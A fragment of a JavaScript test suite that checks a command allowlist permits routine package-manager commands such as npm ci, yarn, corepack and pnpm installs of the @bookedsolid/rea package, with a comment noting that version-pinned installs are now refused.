  it('npm ci -> allow', async () => {
    await withDefaultFixture();
    const r = runAllowlist('npm ci');
    expect(r.stdout).toBe('allow');
  });
  it('yarn -> allow', async () => {
    await withDefaultFixture();
    const r = runAllowlist('yarn');
    expect(r.stdout).toBe('allow');
  });
  it('corepack enable -> allow', async () => {
    await withDefaultFixture();
    const r = runAllowlist('corepack enable');
    expect(r.stdout).toBe('allow');
  });
  it('pnpm i --frozen-lockfile -> allow', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm i --frozen-lockfile');
    expect(r.stdout).toBe('allow');
  });
  it('pnpm add --save-dev @bookedsolid/rea -> allow', async () => {
    await withDefaultFixture();
    const r = runAllowlist('pnpm add --save-dev @bookedsolid/rea');
    expect(r.stdout).toBe('allow');
  });
  it('npm install -D @bookedsolid/rea -> allow', async () => {
    await withDefaultFixture();
    const r = runAllowlist('npm install -D @bookedsolid/rea');
    expect(r.stdout).toBe('allow');
  });
  it('yarn add -D @bookedsolid/rea (bare) -> allow (R6-P2: bare-only)', async () => {
    // R6-P2 (codex round 6): the bare-only spec is the canonical
    // bootstrap allow. The version-pinned form `yarn add -D
    // @bookedsolid/rea@1.0.0` was permitted pre-R6 and is now
    // refused (see D.18). The bare form installs whatever the
    // consumer's existing self-pin admits.
    await withDefaultFixture();
    const r = runAllowlist('yarn add -D @bookedsolid/rea');
    expect(r.stdout).toBe('allow');
  });
  it('corepack prepare pnpm@8.6.0 --activate -> allow', async () => {
    await withDefaultFixture();
    const r = runAllowlist('corepack prepare pnpm@8.6.0 --activate');
    expect(r.stdout).toBe('allow');
  });
});
